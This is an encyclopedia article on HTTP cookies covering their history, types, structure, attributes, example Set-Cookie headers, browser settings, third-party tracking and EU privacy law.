HTTP cookie - Wikipedia

# HTTP cookie

From Wikipedia, the free encyclopedia

|     |     |
| --- | --- |
| ![50px-Mergefrom.svg.png](../_resources/cebf197bcdab140aa85099e943e4a4ba.png) | It has been suggested that *[Cookiejacking](https://en.wikipedia.org/wiki/Cookiejacking)* be [merged](https://en.wikipedia.org/wiki/Wikipedia:Merging) into this article. ([Discuss](https://en.wikipedia.org/wiki/Talk:HTTP_cookie)) *Proposed since February 2018.* |

|     |     |
| --- | --- |
|     | This article **needs additional citations for [verification](https://en.wikipedia.org/wiki/Wikipedia:Verifiability)**. Please help [improve this article](https://en.wikipedia.org/w/index.php?title=HTTP_cookie&action=edit) by [adding citations to reliable sources](https://en.wikipedia.org/wiki/Help:Introduction_to_referencing_with_Wiki_Markup/1). Unsourced material may be challenged and removed. *(April 2016)*  *([Learn how and when to remove this template message](https://en.wikipedia.org/wiki/Help:Maintenance_template_removal))* |

An **HTTP cookie** (also called **web cookie**, **Internet cookie**, **browser cookie**, or simply **cookie**) is a small piece of data sent from a website and stored on the user's computer by the user's [web browser](https://en.wikipedia.org/wiki/Web_browser) while the user is browsing. Cookies were designed to be a reliable mechanism for websites to remember [stateful](https://en.wikipedia.org/wiki/Program_state) information (such as items added in the shopping cart in an online store) or to record the user's browsing activity (including clicking particular buttons, [logging in](https://en.wikipedia.org/wiki/Access_control), or recording which pages were visited in the past). They can also be used to remember arbitrary pieces of information that the user previously entered into form fields such as names, addresses, passwords, and credit card numbers.

Other kinds of cookies perform essential functions in the modern web. Perhaps most importantly, **authentication cookies** are the most common method used by web servers to know whether the user is logged in or not, and which account they are logged in with. Without such a mechanism, the site would not know whether to send a page containing sensitive information, or require the user to authenticate themselves by logging in. The security of an authentication cookie generally depends on the security of the issuing website and the user's [web browser](https://en.wikipedia.org/wiki/Comparison_of_web_browsers#Vulnerabilities), and on whether the cookie data is encrypted. Security vulnerabilities may allow a cookie's data to be read by a [hacker](https://en.wikipedia.org/wiki/Hacker_(computer_security)), used to gain access to user data, or used to gain access (with the user's credentials) to the website to which the cookie belongs (see [cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) and [cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery) for examples).[[1]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-1)

The tracking cookies, and especially [third-party tracking cookies](https://en.wikipedia.org/wiki/HTTP_cookie#Third-party_cookie), are commonly used as ways to compile long-term records of individuals' browsing histories – a potential [privacy concern](https://en.wikipedia.org/wiki/Internet_privacy#HTTP_cookies) that prompted European[[2]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-2) and U.S. lawmakers to take action in 2011.[[3]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-eulaw-3)[[4]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-4) European law requires that all websites targeting [European Union](https://en.wikipedia.org/wiki/European_Union) member states gain "informed consent" from users before storing non-essential cookies on their device.

Google [project zero](https://en.wikipedia.org/wiki/Project_Zero_(Google)) researcher Jann Horn describes ways cookies can be read by [intermediaries](https://en.wikipedia.org/wiki/Man-in-the-middle_attack), like [Wi-Fi](https://en.wikipedia.org/wiki/Wi-Fi) hostspot providers. He recommends to use the browser in incognito mode in such circumstances.[[5]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-5)

## Background

### Origin of the name

The term "cookie" was coined by web browser programmer [Lou Montulli](https://en.wikipedia.org/wiki/Lou_Montulli). It was derived from the term "[magic cookie](https://en.wikipedia.org/wiki/Magic_cookie)", which is a packet of data a program receives and sends back unchanged, used by [Unix](https://en.wikipedia.org/wiki/Unix) programmers.[[6]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-6)[[7]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-7)

### History

Magic cookies were already used in computing when computer programmer [Lou Montulli](https://en.wikipedia.org/wiki/Lou_Montulli) had the idea of using them in web communications in June 1994.[[8]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-8) At the time, he was an employee of [Netscape Communications](https://en.wikipedia.org/wiki/Netscape_Communications), which was developing an [e-commerce](https://en.wikipedia.org/wiki/E-commerce) application for [MCI](https://en.wikipedia.org/wiki/MCI_Inc.). [Vint Cerf](https://en.wikipedia.org/wiki/Vint_Cerf) and [John Klensin](https://en.wikipedia.org/wiki/John_Klensin) represented MCI in technical discussions with Netscape Communications. MCI did not want its servers to have to retain partial transaction states, which led them to ask Netscape to find a way to store that state in each user's computer instead. Cookies provided a solution to the problem of reliably implementing a [virtual shopping cart](https://en.wikipedia.org/wiki/Shopping_cart_software).[[9]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-ks-9)[[10]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-kristol-10)

Together with John Giannandrea, Montulli wrote the initial Netscape cookie specification the same year. Version 0.9beta of [Mosaic Netscape](https://en.wikipedia.org/wiki/Netscape_Navigator), released on October 13, 1994,[[11]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-11)[[12]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-12) supported cookies[*[citation needed](https://en.wikipedia.org/wiki/Wikipedia:Citation_needed)*]. The first use of cookies (out of the labs) was checking whether visitors to the Netscape website had already visited the site. Montulli applied for a patent for the cookie technology in 1995, and [US 5774670](https://worldwide.espacenet.com/textdoc?DB=EPODOC&IDX=US5774670) was granted in 1998. Support for cookies was integrated in [Internet Explorer](https://en.wikipedia.org/wiki/Internet_Explorer) in version 2, released in October 1995.[[13]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-13)

The introduction of cookies was not widely known to the public at the time. In particular, cookies were accepted by default, and users were not notified of their presence. The general public learned about cookies after the *[Financial Times](https://en.wikipedia.org/wiki/Financial_Times)* published an article about them on February 12, 1996.[[14]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-14) In the same year, cookies received a lot of media attention, especially because of potential privacy implications. Cookies were discussed in two U.S. [Federal Trade Commission](https://en.wikipedia.org/wiki/Federal_Trade_Commission) hearings in 1996 and 1997.

The development of the formal cookie specifications was already ongoing. In particular, the first discussions about a formal specification started in April 1995 on the www-talk [mailing list](https://en.wikipedia.org/wiki/Electronic_mailing_list). A special working group within the [Internet Engineering Task Force](https://en.wikipedia.org/wiki/Internet_Engineering_Task_Force) (IETF) was formed. Two alternative proposals for introducing state in HTTP transactions had been proposed by [Brian Behlendorf](https://en.wikipedia.org/wiki/Brian_Behlendorf) and David Kristol respectively. But the group, headed by Kristol himself and Lou Montulli, soon decided to use the Netscape specification as a starting point. In February 1996, the working group identified third-party cookies as a considerable privacy threat. The specification produced by the group was eventually published as [RFC 2109](https://tools.ietf.org/html/rfc2109) in February 1997. It specifies that third-party cookies were either not allowed at all, or at least not enabled by default.

At this time, advertising companies were already using third-party cookies. The recommendation about third-party cookies of [RFC 2109](https://tools.ietf.org/html/rfc2109) was not followed by Netscape and Internet Explorer. [RFC 2109](https://tools.ietf.org/html/rfc2109) was superseded by [RFC 2965](https://tools.ietf.org/html/rfc2965) in October 2000.

[RFC 2965](https://tools.ietf.org/html/rfc2965) added a `Set-Cookie2` header, which informally came to be called "[RFC 2965](https://tools.ietf.org/html/rfc2965)-style cookies" as opposed to the original `Set-Cookie` header which was called "Netscape-style cookies".[[15]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-15)[[16]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-16)  `Set-Cookie2` was seldom used however, and was [deprecated](https://en.wikipedia.org/wiki/Deprecate) in [RFC 6265](https://tools.ietf.org/html/rfc6265) in April 2011 which was written as a definitive specification for cookies as used in the real world.[[17]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-HTTPStateMgmtToPS-17)

## Terminology

|     |     |
| --- | --- |
|     | This section **needs additional citations for [verification](https://en.wikipedia.org/wiki/Wikipedia:Verifiability)**. Please help [improve this article](https://en.wikipedia.org/w/index.php?title=HTTP_cookie&action=edit) by [adding citations to reliable sources](https://en.wikipedia.org/wiki/Help:Introduction_to_referencing_with_Wiki_Markup/1). Unsourced material may be challenged and removed. *(August 2011)*  *([Learn how and when to remove this template message](https://en.wikipedia.org/wiki/Help:Maintenance_template_removal))* |

### Session cookie

A *session cookie*, also known as an *in-memory cookie* or *transient cookie*, exists only in temporary memory while the user navigates the website.[[18]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-mscookie-18) Web browsers normally delete session cookies when the user closes the browser.[[19]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-19) Unlike other cookies, session cookies do not have an expiration date assigned to them, which is how the browser knows to treat them as session cookies.

### Persistent cookie

Instead of expiring when the web browser is closed as session cookies do, a *persistent cookie* expires at a specific date or after a specific length of time. This means that, for the cookie's entire lifespan (which can be as long or as short as its creators want), its information will be transmitted to the server every time the user visits the website that it belongs to, or every time the user views a resource belonging to that website from another website (such as an advertisement).

For this reason, persistent cookies are sometimes referred to as *tracking cookies* because they can be used by advertisers to record information about a user's web browsing habits over an extended period of time. However, they are also used for "legitimate" reasons (such as keeping users logged into their accounts on websites, to avoid re-entering login credentials at every visit).

These cookies are however reset if the expiration time is reached or the user manually deletes the cookie.

### Secure cookie

A *secure cookie* can only be transmitted over an encrypted connection (i.e. [HTTPS](https://en.wikipedia.org/wiki/HTTP_Secure)). They cannot be transmitted over unencrypted connections (i.e. [HTTP](https://en.wikipedia.org/wiki/HTTP)). This makes the cookie less likely to be exposed to cookie theft via eavesdropping. A cookie is made secure by adding the `Secure` flag to the cookie.

### HttpOnly cookie

An *HttpOnly cookie* cannot be accessed by client-side APIs, such as JavaScript. This restriction eliminates the threat of cookie theft via [cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (XSS). However, the cookie remains vulnerable to [cross-site tracing](https://en.wikipedia.org/wiki/Cross-site_tracing) (XST) and [cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery) (XSRF) attacks. A cookie is given this characteristic by adding the `HttpOnly` flag to the cookie.

### SameSite cookie

In 2016 [Google Chrome](https://en.wikipedia.org/wiki/Google_Chrome) version 51 introduced[[20]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-20) a new kind of cookie which can only be sent in requests *originating* from the same origin as the target domain. This restriction mitigates attacks such as [cross-site request forgery](https://en.wikipedia.org/wiki/Cross-site_request_forgery) (XSRF).[[21]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-21) A cookie is given this characteristic by setting the `SameSite` flag to `Strict` or `Lax`.[[22]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-22)

### Third-party cookie

Normally, a cookie's domain attribute will match the domain that is shown in the web browser's address bar. This is called a *first-party cookie*. A *third-party cookie*, however, belongs to a domain different from the one shown in the address bar. This sort of cookie typically appears when web pages feature content from external websites, such as banner advertisements. This opens up the potential for tracking the user's browsing history, and is often used by advertisers in an effort to serve relevant advertisements to each user.

As an example, suppose a user visits `www.example.org`. This web site contains an advertisement from `ad.foxytracking.com`, which, when downloaded, sets a cookie belonging to the advertisement's domain (`ad.foxytracking.com`). Then, the user visits another website, `www.foo.com`, which also contains an advertisement from `ad.foxytracking.com`, and which also sets a cookie belonging to that domain (`ad.foxytracking.com`). Eventually, both of these cookies will be sent to the advertiser when loading their advertisements or visiting their website. The advertiser can then use these cookies to build up a browsing history of the user across all the websites that have ads from this advertiser.

As of 2014, some websites were setting cookies readable for over 100 third-party domains.[[23]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-23) On average, a single website was setting 10 cookies, with a maximum number of cookies (first- and third-party) reaching over 800.[[24]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-24)

Most modern web browsers contain privacy settings that can block third-party cookies.

### Supercookie

A *supercookie* is a cookie with an origin of a [top-level domain](https://en.wikipedia.org/wiki/Top-level_domain) (such as `.com`) or a public suffix (such as `.co.uk`). Ordinary cookies, by contrast, have an origin of a specific domain name, such as `example.com`.

Supercookies can be a potential security concern and are therefore often blocked by web browsers. If unblocked by the browser, an attacker in control of a malicious website could set a supercookie and potentially disrupt or impersonate legitimate user requests to another website that shares the same top-level domain or public suffix as the malicious website. For example, a supercookie with an origin of `.com`, could maliciously affect a request made to `example.com`, even if the cookie did not originate from `example.com`. This can be used to fake logins or change user information.

The [Public Suffix List](https://en.wikipedia.org/wiki/Public_Suffix_List)[[25]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-25) helps to mitigate the risk that supercookies pose. The Public Suffix List is a cross-vendor initiative that aims to provide an accurate and up-to-date list of domain name suffixes. Older versions of browsers may not have an up-to-date list, and will therefore be vulnerable to supercookies from certain domains.

#### Other uses

The term "supercookie" is sometimes used for tracking technologies that do not rely on HTTP cookies. Two such "supercookie" mechanisms were found on Microsoft websites in August 2011: cookie syncing that respawned MUID (machine unique identifier) cookies, and [ETag](https://en.wikipedia.org/wiki/HTTP_ETag) cookies.[[26]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-26) Due to media attention, Microsoft later disabled this code.[[27]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-27)

### Zombie cookie

A *zombie cookie* is a cookie that is automatically recreated after being deleted. This is accomplished by storing the cookie's content in multiple locations, such as [Flash Local shared object](https://en.wikipedia.org/wiki/Local_shared_object), [HTML5 Web storage](https://en.wikipedia.org/wiki/Web_storage), and other client-side and even server-side locations. When the cookie's absence is detected, the cookie is recreated using the data stored in these locations.

## Structure

A cookie consists of the following components:[[28]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-Peng,_Weihong_2000-28)[[29]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-Stenberg,_Daniel_2009-29)

1. Name
2. Value

3. Zero or more attributes (name/value pairs). Attributes store information such as the cookie’s expiration, domain, and flags (such as `Secure` and `HttpOnly`).

## Uses

### Session management

Cookies were originally introduced to provide a way for users to record items they want to purchase as they navigate throughout a website (a virtual "shopping cart" or "shopping basket").[[9]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-ks-9)[[10]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-kristol-10) Today, however, the contents of a user's shopping cart are usually stored in a database on the server, rather than in a cookie on the client. To keep track of which user is assigned to which shopping cart, the server sends a cookie to the client that contains a [unique session identifier](https://en.wikipedia.org/wiki/Unique_identifier) (typically, a long string of random letters and numbers). Because cookies are sent to the server with every request the client makes, that session identifier will be sent back to the server every time the user visits a new page on the website, which lets the server know which shopping cart to display to the user.

Another popular use of cookies is for logging into websites. When the user visits a website's login page, the web server typically sends the client a cookie containing a unique session identifier. When the user successfully logs in, the server remembers that that particular session identifier has been authenticated, and grants the user access to its services.

Because session cookies only contain a unique session identifier, this makes the amount of personal information that a website can save about each user virtually limitless—the website is not limited to restrictions concerning how large a cookie can be. Session cookies also help to improve page load times, since the amount of information in a session cookie is small and requires little bandwidth.

### Personalization

Cookies can be used to remember information about the user in order to show relevant content to that user over time. For example, a web server might send a cookie containing the username last used to log into a website so that it may be filled in automatically the next time the user logs in.

Many websites use cookies for personalization based on the user's preferences. Users select their preferences by entering them in a web form and submitting the form to the server. The server encodes the preferences in a cookie and sends the cookie back to the browser. This way, every time the user accesses a page on the website, the server can personalize the page according to the user's preferences. For example, the [Google](https://en.wikipedia.org/wiki/Google) search engine once used cookies to allow users (even non-registered ones) to decide how many search results per page they wanted to see. Also, [DuckDuckGo](https://en.wikipedia.org/wiki/DuckDuckGo) uses cookies to allow users to set the viewing preferences like colors of the web page.

### Tracking

See also: [Web visitor tracking](https://en.wikipedia.org/wiki/Web_visitor_tracking)

Tracking cookies are used to track users' web browsing habits. This can also be done to some extent by using the [IP address](https://en.wikipedia.org/wiki/IP_address) of the computer requesting the page or the [referer](https://en.wikipedia.org/wiki/HTTP_referer) field of the [HTTP](https://en.wikipedia.org/wiki/HTTP) request header, but cookies allow for greater precision. This can be demonstrated as follows:

1. If the user requests a page of the site, but the request contains no cookie, the server presumes that this is the first page visited by the user. So the server creates a unique identifier (typically a string of random letters and numbers) and sends it as a cookie back to the browser together with the requested page.

2. From this point on, the cookie will automatically be sent by the browser to the server every time a new page from the site is requested. The server sends the page as usual, but also stores the URL of the requested page, the date/time of the request, and the cookie in a log file.

By analyzing this log file, it is then possible to find out which pages the user has visited, in what sequence, and for how long.

Corporations exploit users' web habits by tracking cookies to collect information about buying habits. The *[Wall Street Journal](https://en.wikipedia.org/wiki/Wall_Street_Journal)* found that America's top fifty websites installed an average of sixty-four pieces of tracking technology onto computers resulting in a total of 3,180 tracking files.[[30]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-30) The data can then be collected and sold to bidding corporations.

## Implementation

[![220px-HTTP_cookie_exchange.svg.png](../_resources/17a37fab7262e8c8ecbe5bfb7e11046c.png)](https://en.wikipedia.org/wiki/File:HTTP_cookie_exchange.svg)

A possible interaction between a web browser and a web server holding a web page in which the server sends a cookie to the browser and the browser sends it back when requesting another page.

Cookies are arbitrary pieces of data, usually chosen and first sent by the web server, and stored on the client computer by the web browser. The browser then sends them back to the server with every request, introducing [states](https://en.wikipedia.org/wiki/State_(computer_science)) (memory of previous events) into otherwise stateless [HTTP](https://en.wikipedia.org/wiki/HTTP) transactions. Without cookies, each retrieval of a [web page](https://en.wikipedia.org/wiki/Web_page) or component of a web page would be an isolated event, largely unrelated to all other page views made by the user on the website. Although cookies are usually set by the web server, they can also be set by the client using a scripting language such as [JavaScript](https://en.wikipedia.org/wiki/JavaScript) (unless the cookie's `HttpOnly` flag is set, in which case the cookie cannot be modified by scripting languages).

The cookie specifications[[31]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-httponlyrfc-31)[[32]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-32)[[33]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-33) require that browsers meet the following requirements in order to support cookies:

- Can support cookies as large as 4,096 [bytes](https://en.wikipedia.org/wiki/Byte) in size.
- Can support at least 50 cookies per [domain](https://en.wikipedia.org/wiki/Internet_domain) (i.e. per website).
- Can support at least 3,000 cookies in total.

### Setting a cookie

Cookies are set using the `Set-Cookie`  [HTTP header](https://en.wikipedia.org/wiki/HTTP_header), sent in an HTTP response from the web server. This header instructs the web browser to store the cookie and send it back in future requests to the server (the browser will ignore this header if it does not support cookies or has disabled cookies).

As an example, the browser sends its first request for the homepage of the `www.example.org` website:

GET /index.html HTTP/1.1
Host: www.example.org
…
The server responds with two `Set-Cookie` headers:
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: theme=light
Set-Cookie: sessionToken=abc123; Expires=Wed, 09 Jun 2021 10:18:14 GMT
…

The server's HTTP response contains the contents of the website's homepage. But it also instructs the browser to set two cookies. The first, "theme", is considered to be a *session cookie*, since it does not have an `Expires` or `Max-Age` attribute. Session cookies are intended to be deleted by the browser when the browser closes. The second, "sessionToken" is considered to be a *persistent cookie*, since it contains an `Expires` attribute, which instructs the browser to delete the cookie at a specific date and time.

Next, the browser sends another request to visit the `spec.html` page on the website. This request contains a `Cookie` HTTP header, which contains the two cookies that the server instructed the browser to set:

GET /spec.html HTTP/1.1
Host: www.example.org
Cookie: theme=light; sessionToken=abc123
…

This way, the server knows that this request is related to the previous one. The server would answer by sending the requested page, possibly including more `Set-Cookie` headers in the response in order to add new cookies, modify existing cookies, or delete cookies.

The value of a cookie can be modified by the server by including a `Set-Cookie` header in response to a page request. The browser then replaces the old value with the new value.

The value of a cookie may consist of any printable [ASCII](https://en.wikipedia.org/wiki/ASCII) character (`!` through `~`, [Unicode](https://en.wikipedia.org/wiki/Unicode)  `\u0021` through `\u007E`) excluding `,` and `;` and [whitespace characters](https://en.wikipedia.org/wiki/Whitespace_character). The name of a cookie excludes the same characters, as well as `=`, since that is the delimiter between the name and value. The cookie standard [RFC 2965](https://tools.ietf.org/html/rfc2965) is more restrictive but not implemented by browsers.

The term "cookie crumb" is sometimes used to refer to a cookie's name–value pair.[[34]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-CrumbExample-34)

Cookies can also be set by scripting languages such as [JavaScript](https://en.wikipedia.org/wiki/JavaScript) that run within the browser. In JavaScript, the object `document.cookie` is used for this purpose. For example, the instruction `document.cookie = "temperature=20"` creates a cookie of name "temperature" and value "20".[[35]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-35)

### Cookie attributes

In addition to a name and value, cookies can also have one or more attributes. Browsers do not include cookie attributes in requests to the server—they only send the cookie's name and value. Cookie attributes are used by browsers to determine when to delete a cookie, block a cookie or whether to send a cookie to the server.

#### Domain and path

The `Domain` and `Path` attributes define the scope of the cookie. They essentially tell the browser what website the cookie belongs to. For obvious security reasons, cookies can only be set on the current resource's top domain and its sub domains, and not for another domain and its sub domains. For example, the website `example.org` cannot set a cookie that has a domain of `foo.com` because this would allow the `example.org` website to control the cookies of `foo.com`.

If a cookie's `Domain` and `Path` attributes are not specified by the server, they default to the domain and path of the resource that was requested.[[36]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-36) However, in most browsers there is a difference between a cookie set from `foo.com` without a domain, and a cookie set with the `foo.com` domain. In the former case, the cookie will only be sent for requests to `foo.com`, also known as a host-only cookie. In the latter case, all sub domains are also included (for example, `docs.foo.com`).[[37]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-37)[[38]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-38) A notable exception to this general rule is Internet Explorer, which always sends cookies to sub domains regardless of whether the cookie was set with or without a domain.[[39]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-39)

Below is an example of some `Set-Cookie` HTTP response headers that are sent from a website after a user logged in. The HTTP request was sent to a webpage within the `docs.foo.com` subdomain:

HTTP/1.0 200 OK

Set-Cookie: LSID=DQAAAK…Eaem_vYg; Path=/accounts; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly

Set-Cookie: HSID=AYQEVn…DKrdst; Domain=.foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; HttpOnly

Set-Cookie: SSID=Ap4P…GTEq; Domain=foo.com; Path=/; Expires=Wed, 13 Jan 2021 22:23:01 GMT; Secure; HttpOnly

…

The first cookie, `LSID`, has no `Domain` attribute, and has a `Path` attribute set to `/accounts`. This tells the browser to use the cookie only when requesting pages contained in `docs.foo.com/accounts` (the domain is derived from the request domain). The other two cookies, `HSID` and `SSID`, would be used when the browser requests any subdomain in `.foo.com` on any path (for example `www.foo.com/bar`). The prepending dot is optional in recent standards, but can be added for compatibility with [RFC 2109](https://tools.ietf.org/html/rfc2109) based implementations.[[40]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-40)

#### Expires and Max-Age

The `Expires` attribute defines a specific date and time for when the browser should delete the cookie. The date and time are specified in the form `Wdy, DD Mon YYYY HH:MM:SS GMT`, or in the form `Wdy, DD Mon YY HH:MM:SS GMT` for values of YY where YY is greater than or equal to 0 and less than or equal to 69.[[41]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-41)

Alternatively, the `Max-Age` attribute can be used to set the cookie's expiration as an interval of seconds in the future, relative to the time the browser received the cookie. Below is an example of three `Set-Cookie` headers that were received from a website after a user logged in:

HTTP/1.0 200 OK

Set-Cookie: lu=Rg3vHJZnehYLjVg7qi3bZjzg; Expires=Tue, 15 Jan 2013 21:47:38 GMT; Path=/; Domain=.example.com; HttpOnly

Set-Cookie: made_write_conn=1295214458; Path=/; Domain=.example.com

Set-Cookie: reg_fb_gate=deleted; Expires=Thu, 01 Jan 1970 00:00:01 GMT; Path=/; Domain=.example.com; HttpOnly

The first cookie, `lu`, is set to expire sometime on 15 January 2013. It will be used by the client browser until that time. The second cookie, `made_write_conn`, does not have an expiration date, making it a session cookie. It will be deleted after the user closes their browser. The third cookie, `reg_fb_gate`, has its value changed to "deleted", with an expiration time in the past. The browser will delete this cookie right away because its expiration time is in the past. Note that cookie will only be deleted if the domain and path attributes in the `Set-Cookie` field match the values used when the cookie was created.

As of 2016[[update]](https://en.wikipedia.org/w/index.php?title=HTTP_cookie&action=edit) Internet Explorer did not support `Max-Age`.[[42]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-42)[[43]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-43)

#### Secure and HttpOnly

The `Secure` and `HttpOnly` attributes do not have associated values. Rather, the presence of just their attribute names indicates that their behaviors should be enabled.

The `Secure` attribute is meant to keep cookie communication limited to encrypted transmission, directing browsers to use cookies only via [secure/encrypted](https://en.wikipedia.org/wiki/HTTPS) connections. However, if a web server sets a cookie with a secure attribute from a non-secure connection, the cookie can still be intercepted when it is sent to the user by [man-in-the-middle attacks](https://en.wikipedia.org/wiki/Man-in-the-middle_attack). Therefore, for maximum security, cookies with the Secure attribute should only be set over a secure connection.

The `HttpOnly` attribute directs browsers not to expose cookies through channels other than HTTP (and HTTPS) requests. This means that the cookie cannot be accessed via client-side scripting languages (notably [JavaScript](https://en.wikipedia.org/wiki/JavaScript)), and therefore cannot be stolen easily via [cross-site scripting](https://en.wikipedia.org/wiki/Cross-site_scripting) (a pervasive attack technique).[[44]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-Symantec-2007-2nd-exec-44)

## Browser settings

Most modern browsers support cookies and allow the user to disable them. The following are common options:[[45]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-45)

- To enable or disable cookies completely, so that they are always accepted or always blocked.
- To view and selectively delete cookies using a cookie manager.
- To fully wipe all private data, including cookies.

By default, Internet Explorer allows third-party cookies only if they are accompanied by a [P3P](https://en.wikipedia.org/wiki/P3P) "CP" (Compact Policy) field.[[46]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-46)

Add-on tools for managing cookie permissions also exist.[[47]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-microsoft2007-47)[[48]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-48)[[49]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-49)[[50]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-50)

## Privacy and third-party cookies

Cookies have some important implications on the privacy and anonymity of web users. While cookies are sent only to the server setting them or a server in the same Internet domain, a web page may contain images or other components stored on servers in other domains. Cookies that are set during retrieval of these components are called *third-party cookies*. The older standards for cookies, [RFC 2109](https://tools.ietf.org/html/rfc2109) and [RFC 2965](https://tools.ietf.org/html/rfc2965), specify that browsers should protect user privacy and not allow sharing of cookies between servers by default. However, the newer standard, [RFC 6265](https://tools.ietf.org/html/rfc6265), explicitly allows user agents to implement whichever third-party cookie policy they wish. Most browsers, such as [Mozilla Firefox](https://en.wikipedia.org/wiki/Mozilla_Firefox), [Internet Explorer](https://en.wikipedia.org/wiki/Internet_Explorer), [Opera](https://en.wikipedia.org/wiki/Opera_(web_browser)) and [Google Chrome](https://en.wikipedia.org/wiki/Google_Chrome) do allow third-party cookies by default, as long as the third-party website has [Compact Privacy Policy](https://en.wikipedia.org/wiki/P3P) published. Newer versions of [Safari](https://en.wikipedia.org/wiki/Safari_(web_browser)) block third-party cookies, and this is planned for Mozilla Firefox as well (initially planned for version 22 but was postponed indefinitely).[[51]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-51)

[![220px-Third_party_cookie.png](../_resources/ec1f46fb5674c367e300b33c52b8959f.png)](https://en.wikipedia.org/wiki/File:Third_party_cookie.png)

In this fictional example, an advertising company has placed banners in two websites. Hosting the banner images on its servers and using third-party cookies, the advertising company is able to track the browsing of users across these two sites.

Advertising companies use third-party cookies to track a user across multiple sites. In particular, an advertising company can track a user across all pages where it has placed advertising images or [web bugs](https://en.wikipedia.org/wiki/Web_bug). Knowledge of the pages visited by a user allows the advertising company to target advertisements to the user's presumed preferences.

Website operators who do not disclose third-party cookie use to consumers run the risk of harming consumer trust if cookie use is discovered. Having clear disclosure (such as in a [privacy policy](https://en.wikipedia.org/wiki/Privacy_policy)) tends to eliminate any negative effects of such cookie discovery.[[52]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-52)

The possibility of building a profile of users is a privacy threat, especially when tracking is done across multiple domains using third-party cookies. For this reason, some countries have legislation about cookies.

The [United States](https://en.wikipedia.org/wiki/United_States) government has set strict rules on setting cookies in 2000 after it was disclosed that the White House [drug policy office](https://en.wikipedia.org/wiki/Office_of_National_Drug_Control_Policy) used cookies to track computer users viewing its online anti-drug advertising. In 2002, privacy activist Daniel Brandt found that the [CIA](https://en.wikipedia.org/wiki/Central_Intelligence_Agency) had been leaving persistent cookies on computers which had visited its website. When notified it was violating policy, CIA stated that these cookies were not intentionally set and stopped setting them.[[53]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-53) On December 25, 2005, Brandt discovered that the [National Security Agency](https://en.wikipedia.org/wiki/National_Security_Agency) (NSA) had been leaving two persistent cookies on visitors' computers due to a software upgrade. After being informed, the NSA immediately disabled the cookies.[[54]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-54)

### EU cookie directive

In 2002, the European Union launched the [Directive on Privacy and Electronic Communications](https://en.wikipedia.org/wiki/Directive_on_Privacy_and_Electronic_Communications), a policy requiring end users' consent for the placement of cookies, and similar technologies for storing and accessing information on users' equipment.[[55]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-JISC-55)[[56]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-ICO_reference-56) In particular, Article 5 Paragraph 3 mandates that storing data in a user's computer can only be done if the user is provided information about how this data is used, and the user is given the possibility of denying this storing operation.

Directive 95/46/EC defines "the data subject's consent" as "any freely given specific and informed indication of his wishes by which the data subject signifies his agreement to personal data relating to him being processed."[[57]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-57) Consent must involve some form of communication where individuals knowingly indicate their acceptance.[[56]](https://en.wikipedia.org/wiki/HTTP_cookie#cite_note-ICO_reference-56)

